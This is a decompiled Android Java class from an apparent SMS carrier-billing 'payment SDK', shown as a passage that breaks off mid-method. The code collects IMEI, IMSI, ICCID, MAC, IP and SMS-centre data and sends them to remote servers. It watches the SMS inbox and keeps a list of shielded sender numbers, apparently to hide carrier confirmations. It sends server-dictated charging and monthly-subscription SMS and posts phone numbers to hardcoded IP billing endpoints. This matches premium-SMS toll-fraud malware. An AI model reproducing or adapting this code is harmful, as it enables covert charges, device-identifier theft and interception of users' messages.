package com.lp.sdk.yninterface;

import android.annotation.SuppressLint;
import android.app.AlertDialog.Builder;
import android.app.PendingIntent;
import android.app.ProgressDialog;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface.OnKeyListener;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Handler;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import com.fastfun.sdk.FastFunSdk;
import com.lepeng.data.UtilApplication;
import com.lepeng.utils.DeviceUtil;
import com.lepeng.utils.L;
import com.lepeng.utils.NetworkUtil;
import com.lepeng.utils.StrUtil;
import com.lepeng.utils.TelephonyUtil;
import com.lepeng.utils.datastorage.perference.UtilPerference;
import com.lp.sdk.yninterface.data.EnumData.RequestType;
import com.lp.sdk.yninterface.data.SendResult;
import com.lp.sdk.yninterface.data.net.NoPhoneOrder;
import com.lp.sdk.yninterface.data.param.PhoneInfo;
import com.lp.sdk.yninterface.data.param.RequestNoPhoneOrderData;
import com.lp.sdk.yninterface.service.SMSCodeBroadcast;
import com.lp.sdk.yninterface.service.SmsContentObserver;
import com.lp.sdk.yninterface.smscn.SmsUtil;
import com.lp.sdk.yninterface.util.LPDbUtil;
import com.lp.sdk.yninterface.util.PreferencesUtils;
import com.lp.sdk.yninterface.util.request.ServiceParams;
import com.lp.sdk.yninterface.util.request.UserService;
import com.push2.sdk.PushApplicationInit;
import com.push2.sdk.PushListener.OnInitListener;
import com.push2.sdk.PushListener.OnPayListener;
import com.push2.sdk.PushSDK;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Map.Entry;
import java.util.Set;
import net.tsz.afinal.FinalHttp;
import net.tsz.afinal.http.AjaxParams;
import org.json.JSONException;
import org.json.JSONObject;

@SuppressLint({"UnlocalizedSms"})
public class YNInterface
{
  private static final String H = "FASTFUN_SENT_SMS_ACTION";
  private static final String I = "LY_SENT_SMS_ACTION";
  private static final String J = "WXCJ_SENT_SMS_ACTION";
  private static final String jdField_K_of_type_JavaLangString = "SENT_SMS_ACTION";
  private static final String jdField_L_of_type_JavaLangString = "BYONE_SENT_SMS_ACTION";
  private static int jdField_M_of_type_Int = 0;
  private static final String jdField_M_of_type_JavaLangString = "BYTWO_SENT_SMS_ACTION";
  private static final int jdField_N_of_type_Int = 21000;
  private static final String jdField_N_of_type_JavaLangString = "DXPT_SENT_SMS_ACTION";
  private static final String O = "FFYY_SENT_SMS_ACTION";
  private static final String P = "JSDDDO_SENT_SMS_ACTION";
  private static final String T = "send_id";
  private static YNInterface jdField_a_of_type_ComLpSdkYninterfaceYNInterface;
  private static String af = "";
  private int jdField_K_of_type_Int;
  private int jdField_L_of_type_Int;
  private String Q;
  private String R;
  private String S;
  private String U = "";
  private String V = "";
  private String W;
  private String X;
  private String Y;
  String Z = "";
  PendingIntent jdField_a_of_type_AndroidAppPendingIntent;
  private ProgressDialog jdField_a_of_type_AndroidAppProgressDialog;
  private DialogInterface.OnKeyListener jdField_a_of_type_AndroidContentDialogInterface$OnKeyListener = new YNInterface.17(this);
  private Handler jdField_a_of_type_AndroidOsHandler = new YNInterface.12(this);
  private PayListener jdField_a_of_type_ComLpSdkYninterfacePayListener;
  private YNInterface.SMSReceiver jdField_a_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver;
  private NoPhoneOrder jdField_a_of_type_ComLpSdkYninterfaceDataNetNoPhoneOrder;
  private PhoneInfo jdField_a_of_type_ComLpSdkYninterfaceDataParamPhoneInfo;
  private SmsContentObserver jdField_a_of_type_ComLpSdkYninterfaceServiceSmsContentObserver;
  PushListener.OnInitListener jdField_a_of_type_ComPush2SdkPushListener$OnInitListener = new YNInterface.18(this);
  PushListener.OnPayListener jdField_a_of_type_ComPush2SdkPushListener$OnPayListener = new YNInterface.19(this);
  String aa = "";
  String ab = "";
  String ac = "";
  String ad = "";
  String ae = "";
  private long jdField_b_of_type_Long;
  PendingIntent jdField_b_of_type_AndroidAppPendingIntent;
  private YNInterface.SMSReceiver jdField_b_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver;
  private PhoneInfo jdField_b_of_type_ComLpSdkYninterfaceDataParamPhoneInfo;
  String[] jdField_b_of_type_ArrayOfJavaLangString = new String[0];
  PendingIntent jdField_c_of_type_AndroidAppPendingIntent;
  private YNInterface.SMSReceiver jdField_c_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver;
  private Context ctx;
  PendingIntent jdField_d_of_type_AndroidAppPendingIntent;
  private YNInterface.SMSReceiver jdField_d_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver;
  PendingIntent jdField_e_of_type_AndroidAppPendingIntent;
  private YNInterface.SMSReceiver jdField_e_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver;
  PendingIntent jdField_f_of_type_AndroidAppPendingIntent;
  private YNInterface.SMSReceiver jdField_f_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver;
  private Map jdField_f_of_type_JavaUtilMap;
  PendingIntent jdField_g_of_type_AndroidAppPendingIntent;
  private YNInterface.SMSReceiver jdField_g_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver;
  PendingIntent jdField_h_of_type_AndroidAppPendingIntent;
  private YNInterface.SMSReceiver jdField_h_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver;
  private Handler handler = new YNInterface.1(this);
  PendingIntent jdField_i_of_type_AndroidAppPendingIntent;
  private YNInterface.SMSReceiver jdField_i_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver;
  private int index = 0;
  PendingIntent j;
  private int mcc = 0;
  private int mnc = 0;
  private boolean p = true;
  private boolean q = true;
  private boolean r = false;
  private boolean s;
  private boolean t = true;
  
  static
  {
    M = 0;
  }
  
  @SuppressLint({"HandlerLeak"})
  private YNInterface()
  {
    this.K = 0;
    this.L = 0;
  }
  
  private YNInterface(Context paramContext)
  {
    this.K = 0;
    this.L = 0;
    this.ctx = paramContext;
    new UtilApplication(paramContext);
  }
  
  private Boolean a()
  {
    Iterator localIterator = getSendResults().entrySet().iterator();
    SendResult localSendResult;
    do
    {
      if (!localIterator.hasNext())
      {
        L.i("没有成功的,支付失败");
        return null;
      }
      localSendResult = (SendResult)((Map.Entry)localIterator.next()).getValue();
      if (localSendResult.getSendStatus() == 1)
      {
        L.i("有成功的,支付成功");
        return Boolean.valueOf(true);
      }
    } while (localSendResult.getSendStatus() != 2);
    L.i("有失败的。");
    return Boolean.valueOf(false);
  }
  
  private String a(int paramInt)
  {
    return (paramInt & 0xFF) + "." + (paramInt >> 8 & 0xFF) + "." + (paramInt >> 16 & 0xFF) + "." + (paramInt >> 24 & 0xFF);
  }
  
  private void a(String paramString, int paramInt)
  {
    if (M <= 40) {}
    do
    {
      try
      {
        Thread.sleep(4000L);
        L.i("等待2s再获取支付结果数据" + M);
        paySMSResult(paramString, paramInt);
        return;
      }
      catch (InterruptedException paramString)
      {
        paramString.printStackTrace();
        return;
      }
      if (paramInt == 0)
      {
        new Thread(new YNInterface.13(this, paramInt)).start();
        return;
      }
    } while (paramInt != 1);
    L.i("获取不到信息");
    a(false);
  }
  
  private void a(String paramString, boolean paramBoolean)
  {
    FinalHttp localFinalHttp = new FinalHttp();
    localFinalHttp.configTimeout(20000);
    localFinalHttp.post(paramString, new YNInterface.10(this, paramBoolean));
  }
  
  private void a(boolean paramBoolean)
  {
    L.e("send fee success == " + paramBoolean);
    this.q = false;
    unRegisterReceiver();
    this.jdField_a_of_type_ComLpSdkYninterfaceServiceSmsContentObserver.setMobileText(null);
    this.jdField_a_of_type_ComLpSdkYninterfaceServiceSmsContentObserver.setNumber(null);
    this.jdField_a_of_type_ComLpSdkYninterfaceServiceSmsContentObserver.setSmsBody(null);
    PreferencesUtils.putString(this.ctx, "mobileText", null);
    PreferencesUtils.putString(this.ctx, "phoneNumber", null);
    PreferencesUtils.putString(this.ctx, "smsbody", null);
    if (paramBoolean)
    {
      l();
      return;
    }
    m();
  }
  
  private void b(int paramInt)
  {
    if (!NetworkUtil.detect(UtilApplication.getInstance().ctx))
    {
      a(false);
      return;
    }
    Log.d("cityname====", af);
    this.W = getIp();
    this.Y = getLocalMacAddress();
    L.i("IMEI:" + TelephonyUtil.getIMEI() + ";IMSI:" + TelephonyUtil.getIMSI() + ";phonemac:" + this.Y);
    RequestNoPhoneOrderData localRequestNoPhoneOrderData = new RequestNoPhoneOrderData(EnumData.RequestType.REQUEST_ONPHONE_ORDER.strName(), this.Q, this.R, this.S, this.U, this.W, this.Y, paramInt, TelephonyUtil.getIMEI(), TelephonyUtil.getIMSI(), this.X, DeviceUtil.getDeviceModel(), getOperatorMessage(), "sdk2.4.5", "sms", TelephonyUtil.getICCID(), this.K, DeviceUtil.getOSVersion());
    Log.e("requestparams==", "imei=" + TelephonyUtil.getIMEI() + ",imsi=" + TelephonyUtil.getIMSI() + ",ip=" + this.W + ",lac=" + this.K);
    Log.d("requestNoPhoneOrderData===", "====" + localRequestNoPhoneOrderData);
    UserService.getDataFromServer(Boolean.valueOf(false), localRequestNoPhoneOrderData, new YNInterface.3(this, paramInt));
  }
  
  @SuppressLint({"HandlerLeak"})
  private void c(int paramInt)
  {
    M = 0;
    this.q = true;
    this.V = this.jdField_a_of_type_ComLpSdkYninterfaceDataNetNoPhoneOrder.getOrderCode();
    this.s = this.jdField_a_of_type_ComLpSdkYninterfaceDataNetNoPhoneOrder.isSync();
    String str = this.jdField_a_of_type_ComLpSdkYninterfaceDataNetNoPhoneOrder.getPort();
    if (!SMSCodeBroadcast.getShieldStrs().contains(str)) {
      SMSCodeBroadcast.getShieldStrs().add(str);
    }
    if (this.jdField_a_of_type_ComLpSdkYninterfaceDataNetNoPhoneOrder.isRestitution()) {
      a(true);
    }
    do
    {
      do
      {
        return;
        if (!NetworkUtil.detect(UtilApplication.getInstance().ctx))
        {
          a(false);
          return;
        }
        if ("".equalsIgnoreCase(this.jdField_a_of_type_ComLpSdkYninterfaceDataNetNoPhoneOrder.getChargCommand2())) {
          break;
        }
        this.index = -1;
        sendPassageMsg(this.jdField_a_of_type_ComLpSdkYninterfaceDataNetNoPhoneOrder.getChargCommand2(), this.index, paramInt);
      } while ("".equalsIgnoreCase(this.jdField_a_of_type_ComLpSdkYninterfaceDataNetNoPhoneOrder.getChargCommand()));
      sendPassageMsg(this.jdField_a_of_type_ComLpSdkYninterfaceDataNetNoPhoneOrder.getChargCommand(), this.index, paramInt);
      return;
    } while ("".equalsIgnoreCase(this.jdField_a_of_type_ComLpSdkYninterfaceDataNetNoPhoneOrder.getChargCommand()));
    sendPassageMsg(this.jdField_a_of_type_ComLpSdkYninterfaceDataNetNoPhoneOrder.getChargCommand(), this.index, paramInt);
  }
  
  private void g(String paramString)
  {
    FinalHttp localFinalHttp = new FinalHttp();
    AjaxParams localAjaxParams = new AjaxParams();
    String str = "";
    switch (this.jdField_a_of_type_ComLpSdkYninterfaceDataNetNoPhoneOrder.getPrice())
    {
    }
    for (;;)
    {
      localAjaxParams.put("cdid", "lep");
      localAjaxParams.put("phone", paramString);
      localAjaxParams.put("pdcode", str);
      localAjaxParams.put("fee", String.valueOf(this.jdField_a_of_type_ComLpSdkYninterfaceDataNetNoPhoneOrder.getPrice() * 100));
      localAjaxParams.put("exdata1", this.jdField_a_of_type_ComLpSdkYninterfaceDataNetNoPhoneOrder.getOrderId());
      localAjaxParams.put("exdata2", "");
      Log.d("ddoAjaxParams==", "===" + localAjaxParams);
      localFinalHttp.post("http://113.107.161.68:9381/ddo/xrddo.jsp?", localAjaxParams, new YNInterface.8(this));
      return;
      str = "qjta0375";
      continue;
      str = "qjta0376";
      continue;
      str = "qjta0377";
      continue;
      str = "qjta0378";
      continue;
      str = "qjta0379";
      continue;
      str = "qjta0380";
      continue;
      str = "qjta0381";
    }
  }
  
  public static YNInterface getInstance(Context paramContext)
  {
    if (jdField_a_of_type_ComLpSdkYninterfaceYNInterface == null) {
      jdField_a_of_type_ComLpSdkYninterfaceYNInterface = new YNInterface(paramContext);
    }
    return jdField_a_of_type_ComLpSdkYninterfaceYNInterface;
  }
  
  private String getIp()
  {
    Object localObject = (WifiManager)this.ctx.getSystemService("wifi");
    String str;
    if (!((WifiManager)localObject).isWifiEnabled())
    {
      str = getLocalIpAddress();
      L.i("输出得到的IP地址" + str);
      localObject = str;
      if (StrUtil.isEmptyOrNull(str)) {
        localObject = "";
      }
    }
    do
    {
      return localObject;
      str = a(((WifiManager)localObject).getConnectionInfo().getIpAddress());
      localObject = str;
    } while (!StrUtil.isEmptyOrNull(str));
    return "";
  }
  
  private void h(String paramString)
  {
    FinalHttp localFinalHttp = new FinalHttp();
    AjaxParams localAjaxParams = new AjaxParams();
    String str2 = "";
    String str1;
    int k;
    switch (this.jdField_a_of_type_ComLpSdkYninterfaceDataNetNoPhoneOrder.getPrice())
    {
    case 7: 
    case 8: 
    case 9: 
    default: 
      str1 = "1001";
      k = 18 - this.jdField_a_of_type_ComLpSdkYninterfaceDataNetNoPhoneOrder.getOrderId().length();
    }
    for (;;)
    {
      if (k <= 0)
      {
        localAjaxParams.put("linkid", str2 + this.jdField_a_of_type_ComLpSdkYninterfaceDataNetNoPhoneOrder.getOrderId());
        localAjaxParams.put("mobile", paramString);
        localAjaxParams.put("spid", "6");
        localAjaxParams.put("cpid", "16");
        localAjaxParams.put("consumeCode", str1);
        localAjaxParams.put("longnum", "10658099");
        Log.d("ddoAjaxParams==", "===" + localAjaxParams);
        localFinalHttp.get("http://218.95.37.4:10901/ddo.aspx?", localAjaxParams, new YNInterface.9(this));
        return;
        str1 = "1006";
        break;
        str1 = "1007";
        break;
        str1 = "1011";
        break;
      }
      str2 = str2 + "0";
      k -= 1;
    }
  }
  
  private void j()
  {
    if (TelephonyUtil.getSimState() == 5)
    {
      new Handler().postDelayed(new YNInterface.22(this), 1L);
      return;
    }
    L.i("手机状态不正确,初始化失败");
    L.toastShort("手机状态不正确，不能初始化");
    setInitSuccess(false);
  }
  
  private void k()
  {
    AlertDialog.Builder localBuilder = new AlertDialog.Builder(this.ctx);
    localBuilder.setTitle("支付通知");
    localBuilder.setMessage("支付完成，若2-3分钟未获得道具，请致电:0512-68888888咨询");
    localBuilder.setIcon(17301659);
    localBuilder.setPositiveButton("确定", new YNInterface.23(this));
    localBuilder.setNegativeButton("取消", new YNInterface.2(this));
    localBuilder.show();
  }
  
  private void l()
  {
    if (this.jdField_a_of_type_ComLpSdkYninterfacePayListener != null) {
      this.jdField_a_of_type_ComLpSdkYninterfacePayListener.onPaySuccess(this.U, this.V);
    }
  }
  
  private void m()
  {
    if ((this.jdField_a_of_type_ComLpSdkYninterfacePayListener != null) && (!NetworkUtil.detect(UtilApplication.getInstance().ctx)))
    {
      this.jdField_a_of_type_ComLpSdkYninterfacePayListener.onPayError("未连接网络，无法支付", this.U, this.V);
      return;
    }
    if (this.t)
    {
      this.jdField_a_of_type_ComLpSdkYninterfacePayListener.onPayError("支付失败", this.U, this.V);
      return;
    }
    this.t = true;
    this.jdField_a_of_type_ComLpSdkYninterfacePayListener.onPayError("未获取到用户手机唯一标识", this.U, this.V);
  }
  
  private void n()
  {
    int k = this.jdField_a_of_type_ComLpSdkYninterfaceDataNetNoPhoneOrder.getPrice();
    FastFunSdk.pay(this.ctx, k * 100, this.jdField_a_of_type_ComLpSdkYninterfaceDataNetNoPhoneOrder.getOrderId(), new YNInterface.7(this));
  }
  
  public void alertdialog()
  {
    AlertDialog.Builder localBuilder = new AlertDialog.Builder(this.ctx);
    localBuilder.setTitle("sdk版本提示");
    localBuilder.setMessage("当前sdk版本为:2.4.5");
    localBuilder.setCancelable(true);
    localBuilder.setPositiveButton("确定", new YNInterface.21(this));
    localBuilder.show();
  }
  
  public void dismissprogressDialog()
  {
    if ((this.jdField_a_of_type_AndroidAppProgressDialog != null) && (this.jdField_a_of_type_AndroidAppProgressDialog.isShowing()))
    {
      this.jdField_a_of_type_AndroidAppProgressDialog.dismiss();
      this.jdField_a_of_type_AndroidAppProgressDialog = null;
    }
  }
  
  public String getLocalIpAddress()
  {
    try
    {
      InetAddress localInetAddress;
      do
      {
        localObject = NetworkInterface.getNetworkInterfaces();
        Enumeration localEnumeration;
        while (!localEnumeration.hasMoreElements())
        {
          if (!((Enumeration)localObject).hasMoreElements()) {
            break;
          }
          localEnumeration = ((NetworkInterface)((Enumeration)localObject).nextElement()).getInetAddresses();
        }
        localInetAddress = (InetAddress)localEnumeration.nextElement();
      } while (localInetAddress.isLoopbackAddress());
      Object localObject = localInetAddress.getHostAddress().toString();
      return localObject;
    }
    catch (SocketException localSocketException)
    {
      L.i("WifiPreference IpAddress" + localSocketException.toString());
    }
    return null;
  }
  
  public String getLocalMacAddress()
  {
    String str2 = ((WifiManager)this.ctx.getSystemService("wifi")).getConnectionInfo().getMacAddress();
    String str1 = str2;
    if (StrUtil.isEmptyOrNull(str2)) {
      str1 = "";
    }
    return str1;
  }
  
  public String getOperatorMessage()
  {
    Object localObject2 = ((TelephonyManager)this.ctx.getSystemService("phone")).getSimOperator();
    Object localObject1;
    if (localObject2 != null) {
      if ((((String)localObject2).equals("46000")) || (((String)localObject2).equals("46002")) || (((String)localObject2).equals("46007"))) {
        localObject1 = "Y";
      }
    }
    for (;;)
    {
      localObject2 = localObject1;
      if (StrUtil.isEmptyOrNull((String)localObject1)) {
        localObject2 = "";
      }
      return localObject2;
      if ((((String)localObject2).equals("46001")) || (((String)localObject2).equals("46006")))
      {
        localObject1 = "L";
      }
      else if ((!((String)localObject2).equals("46003")) && (!((String)localObject2).equals("46005")) && (!((String)localObject2).equals("46009")))
      {
        localObject1 = localObject2;
        if (!((String)localObject2).equals("46011")) {}
      }
      else
      {
        localObject1 = "D";
        continue;
        localObject1 = TelephonyUtil.getIMSI();
        if ((((String)localObject1).startsWith("46000")) || (((String)localObject1).startsWith("46002")) || (((String)localObject1).startsWith("46007"))) {
          localObject1 = "Y";
        } else if ((((String)localObject1).startsWith("46001")) || (((String)localObject1).startsWith("46006"))) {
          localObject1 = "L";
        } else if ((((String)localObject1).startsWith("46003")) || (((String)localObject1).startsWith("46005")) || (((String)localObject1).startsWith("46009")) || (((String)localObject1).startsWith("46011"))) {
          localObject1 = "D";
        } else {
          localObject1 = "T";
        }
      }
    }
  }
  
  public PayListener getPayListener()
  {
    return this.jdField_a_of_type_ComLpSdkYninterfacePayListener;
  }
  
  public Map getSendResults()
  {
    if (this.jdField_f_of_type_JavaUtilMap == null) {
      this.jdField_f_of_type_JavaUtilMap = new HashMap();
    }
    return this.jdField_f_of_type_JavaUtilMap;
  }
  
  public void initSdk(String paramString1, String paramString2)
  {
    FastFunSdk.init(this.ctx, "yp01");
    this.X = SmsUtil.getInstance(this.ctx).getSmsCenter();
    L.i("获取的短信中心号码：" + this.X);
    if ((this.X == null) || (this.X.length() < 1)) {
      this.X = "";
    }
    SMSCodeBroadcast.getShieldStrs().clear();
    UtilPerference.setShieldStr("");
    setShieldNum();
    L.i("屏蔽号码：" + SMSCodeBroadcast.getShieldStrs().toString());
    this.jdField_a_of_type_ComLpSdkYninterfaceServiceSmsContentObserver = new SmsContentObserver(this.ctx, new Handler());
    this.ctx.getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, this.jdField_a_of_type_ComLpSdkYninterfaceServiceSmsContentObserver);
    L.i("初始化SDK");
    if (StrUtil.isEmptyOrNull(paramString1))
    {
      L.i("APP编号为空");
      L.toastShort("APP编号不能为空");
      setInitSuccess(false);
      return;
    }
    if (StrUtil.isEmptyOrNull(paramString2))
    {
      L.i("渠道号为空");
      L.toastShort("渠道编号不能为空");
      setInitSuccess(false);
      return;
    }
    try
    {
      this.Q = paramString1;
      this.S = paramString2;
      setInitSuccess(true);
      this.jdField_a_of_type_ComLpSdkYninterfaceDataParamPhoneInfo = ((PhoneInfo)UtilApplication.getInstance().getDbUtil().findById(TelephonyUtil.getIMEI() + "|" + TelephonyUtil.getIMSI(), PhoneInfo.class));
      if ((this.jdField_a_of_type_ComLpSdkYninterfaceDataParamPhoneInfo != null) && (this.jdField_a_of_type_ComLpSdkYninterfaceDataParamPhoneInfo.getPhoneId().equals(TelephonyUtil.getIMEI() + "|" + TelephonyUtil.getIMSI())) && (this.jdField_a_of_type_ComLpSdkYninterfaceDataParamPhoneInfo.isPhoneNumFlag()))
      {
        L.i("数据库中存在了此手机信息" + this.jdField_a_of_type_ComLpSdkYninterfaceDataParamPhoneInfo.getCount());
        return;
      }
    }
    catch (Exception paramString1)
    {
      for (;;)
      {
        L.i("DES加密失败,初始化失败");
        setInitSuccess(false);
        paramString1.printStackTrace();
      }
      if (this.jdField_a_of_type_ComLpSdkYninterfaceDataParamPhoneInfo == null)
      {
        this.jdField_a_of_type_ComLpSdkYninterfaceDataParamPhoneInfo = new PhoneInfo();
        this.jdField_a_of_type_ComLpSdkYninterfaceDataParamPhoneInfo.setCount(0);
      }
      if ((StrUtil.isEmptyOrNull(TelephonyUtil.getIMEI())) || (StrUtil.isEmptyOrNull(TelephonyUtil.getIMSI())) || (TelephonyUtil.getIMSI().equalsIgnoreCase("0000000000")) || (TelephonyUtil.getIMSI().equalsIgnoreCase("012345678901234")))
      {
        L.i("没有得到手机imsi和imei");
        this.t = false;
        L.toastShort("未获取用户相关信息！");
        return;
      }
      paramString1 = new ServiceParams(EnumData.RequestType.GET_PHONENUM.strName());
      paramString1.put("imei", TelephonyUtil.getIMEI());
      paramString1.put("imsi", TelephonyUtil.getIMSI());
      new Thread(new YNInterface.20(this, paramString1)).start();
    }
  }
  
  public boolean isInitSuccess()
  {
    return this.p;
  }
  
  public void pay(String paramString, int paramInt, PayListener paramPayListener)
  {
    pay(null, paramString, paramInt, paramPayListener);
  }
  
  public void pay(String paramString1, String paramString2, int paramInt, PayListener paramPayListener)
  {
    if (paramString1 != null) {
      this.U = paramString1;
    }
    this.r = false;
    getSendResults().clear();
    if (!isInitSuccess())
    {
      L.toastLong("初始化失败，请重新初始化");
      return;
    }
    if (StrUtil.isEmptyOrNull(paramString2))
    {
      L.toastShort("没有计费代码，不能进行计费");
      return;
    }
    this.jdField_a_of_type_ComLpSdkYninterfacePayListener = paramPayListener;
    try
    {
      this.R = paramString2;
      b(paramInt);
      return;
    }
    catch (Exception paramString1)
    {
      setInitSuccess(false);
      paramString1.printStackTrace();
      L.toastLong("初始化失败，请重新初始化");
    }
  }
  
  public void payResult(boolean paramBoolean, String paramString)
  {
    L.i("通知后台支付状态");
    ServiceParams localServiceParams;
    if (this.jdField_a_of_type_ComLpSdkYninterfaceDataNetNoPhoneOrder != null)
    {
      localServiceParams = new ServiceParams(EnumData.RequestType.PAY_ORDER.strName());
      localServiceParams.put("orderId", this.jdField_a_of_type_ComLpSdkYninterfaceDataNetNoPhoneOrder.getOrderId());
      if (!paramBoolean) {
        break label109;
      }
      if (!this.r) {
        break label88;
      }
      localServiceParams.put("payResult", paramString);
      localServiceParams.put("resultMessage", "发送短信成功");
    }
    for (;;)
    {
      UserService.getDataFromServer(Boolean.valueOf(true), localServiceParams, new YNInterface.14(this));
      return;
      label88:
      localServiceParams.put("payResult", paramString);
      localServiceParams.put("resultMessage", "扣费成功");
      continue;
      label109:
      if (this.s)
      {
        localServiceParams.put("payResult", paramString);
        localServiceParams.put("resultMessage", "扣费失败");
      }
      else
      {
        localServiceParams.put("payResult", paramString);
        localServiceParams.put("resultMessage", "发送短信失败");
      }
    }
  }
  
  public void paySMSResult(String paramString, int paramInt)
  {
    Log.e("8888", "8888");
    M += 1;
    ServiceParams localServiceParams = new ServiceParams(EnumData.RequestType.PAY_RESULE.strName());
    localServiceParams.put("orderCode", paramString);
    new Thread(new YNInterface.11(this, localServiceParams, paramString, paramInt)).start();
  }
  
  public void registerReceiver()
  {
    FastFunSdk.onResume();
    FastFunSdk.onPause();
    if (this.ctx != null)
    {
      this.jdField_a_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver = new YNInterface.SMSReceiver(this);
      IntentFilter localIntentFilter = new IntentFilter("BYONE_SENT_SMS_ACTION");
      this.ctx.registerReceiver(this.jdField_a_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver, localIntentFilter);
      this.jdField_b_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver = new YNInterface.SMSReceiver(this);
      localIntentFilter = new IntentFilter("BYTWO_SENT_SMS_ACTION");
      this.ctx.registerReceiver(this.jdField_b_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver, localIntentFilter);
      this.jdField_c_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver = new YNInterface.SMSReceiver(this);
      localIntentFilter = new IntentFilter("SENT_SMS_ACTION");
      this.ctx.registerReceiver(this.jdField_c_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver, localIntentFilter);
      this.d = new YNInterface.SMSReceiver(this);
      localIntentFilter = new IntentFilter("FASTFUN_SENT_SMS_ACTION");
      this.ctx.registerReceiver(this.d, localIntentFilter);
      this.jdField_e_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver = new YNInterface.SMSReceiver(this);
      localIntentFilter = new IntentFilter("LY_SENT_SMS_ACTION");
      this.ctx.registerReceiver(this.jdField_e_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver, localIntentFilter);
      this.jdField_f_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver = new YNInterface.SMSReceiver(this);
      localIntentFilter = new IntentFilter("WXCJ_SENT_SMS_ACTION");
      this.ctx.registerReceiver(this.jdField_f_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver, localIntentFilter);
      this.h = new YNInterface.SMSReceiver(this);
      localIntentFilter = new IntentFilter("FFYY_SENT_SMS_ACTION");
      this.ctx.registerReceiver(this.h, localIntentFilter);
      this.jdField_i_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver = new YNInterface.SMSReceiver(this);
      localIntentFilter = new IntentFilter("JSDDDO_SENT_SMS_ACTION");
      this.ctx.registerReceiver(this.jdField_i_of_type_ComLpSdkYninterfaceYNInterface$SMSReceiver, localIntentFilter);
      L.i("注册发送状态监听");
      return;
    }
    L.i("ctx为空,注册监听失败");
  }
  
  @SuppressLint({"NewApi"})
  public void sendPassageMsg(String paramString, int paramInt1, int paramInt2)
  {
    registerReceiver();
    L.e("sendPassageMsg===" + paramString);
    if ((paramInt1 == -1) || (paramInt1 == 0)) {
      this.jdField_b_of_type_Long = System.currentTimeMillis();
    }
    Object localObject1 = "send_id:" + paramInt1;
    Object localObject2 = new Intent("SENT_SMS_ACTION");
    ((Intent)localObject2).putExtra("send_id", (String)localObject1);
    Object localObject3 = new Intent("BYONE_SENT_SMS_ACTION");
    ((Intent)localObject3).putExtra("send_id", (String)localObject1);
    Intent localIntent1 = new Intent("BYTWO_SENT_SMS_ACTION");
    localIntent1.putExtra("send_id", (String)localObject1);
    Intent localIntent2 = new Intent("FASTFUN_SENT_SMS_ACTION");
    localIntent2.putExtra("send_id", (String)localObject1);
    Intent localIntent3 = new Intent("LY_SENT_SMS_ACTION");
    localIntent3.putExtra("send_id", (String)localObject1);
    Intent localIntent4 = new Intent("WXCJ_SENT_SMS_ACTION");
    localIntent4.putExtra("send_id", (String)localObject1);
    Intent localIntent5 = new Intent("FFYY_SENT_SMS_ACTION");
    localIntent5.putExtra("send_id", (String)localObject1);
    Intent localIntent6 = new Intent("JSDDDO_SENT_SMS_ACTION");
    localIntent6.putExtra("send_id", (String)localObject1);
    this.jdField_a_of_type_AndroidAppPendingIntent = PendingIntent.getBroadcast(this.ctx, paramInt1, (Intent)localObject2, 0);
    this.jdField_b_of_type_AndroidAppPendingIntent = PendingIntent.getBroadcast(this.ctx, paramInt1, (Intent)localObject3, 0);
    this.jdField_c_of_type_AndroidAppPendingIntent = PendingIntent.getBroadcast(this.ctx, paramInt1, localIntent1, 0);
    this.jdField_e_of_type_AndroidAppPendingIntent = PendingIntent.getBroadcast(this.ctx, paramInt1, localIntent2, 0);
    this.jdField_f_of_type_AndroidAppPendingIntent = PendingIntent.getBroadcast(this.ctx, paramInt1, localIntent3, 0);
    this.g = PendingIntent.getBroadcast(this.ctx, paramInt1, localIntent4, 0);
    this.jdField_i_of_type_AndroidAppPendingIntent = PendingIntent.getBroadcast(this.ctx, paramInt1, localIntent5, 0);
    this.j = PendingIntent.getBroadcast(this.ctx, paramInt1, localIntent6, 0);
    localObject2 = new SendResult((String)localObject1, 4);
    getSendResults().put(localObject1, localObject2);
    L.i("输出得到的数据" + paramString);
    if (!NetworkUtil.detect(UtilApplication.getInstance().ctx)) {
      a(false);
    }
    while ((paramString == null) || (!StrUtil.notEmptyOrNull(paramString))) {
      return;
    }
    if (paramString.startsWith("TWICE"))
    {
      localObject1 = paramString.split(",");
      localObject2 = paramString.split(",")[1];
      localObject3 = paramString.split(",")[2];
      paramString = paramString.split(",")[3];
      this.jdField_a_of_type_ComLpSdkYninterfaceServiceSmsContentObserver.setNumber((String)localObject3);
      if (localObject1[(localObject1.length - 1)].equals("3"))
      {
        new Thread(new YNInterface.4(this, (String)localObject2, (String)localObject3, paramString)).start();
        return;
      }
      new Thread(new YNInterface.5(this, (String)localObject2, paramString)).start();
      return;
    }
    if (paramString.startsWith("BAOYUE"))
    {
      localObject2 = paramString.split(",");
      if (localObject2.length < 4)
      {
        localObject1 = localObject2[2];
        paramString = localObject2[2];
      }
      for (;;)
      {
        this.jdField_a_of_type_ComLpSdkYninterfaceServiceSmsContentObserver.setNumber((String)localObject1);
        this.jdField_a_of_type_ComLpSdkYninterfaceServiceSmsContentObserver.setSendNumber(paramString);
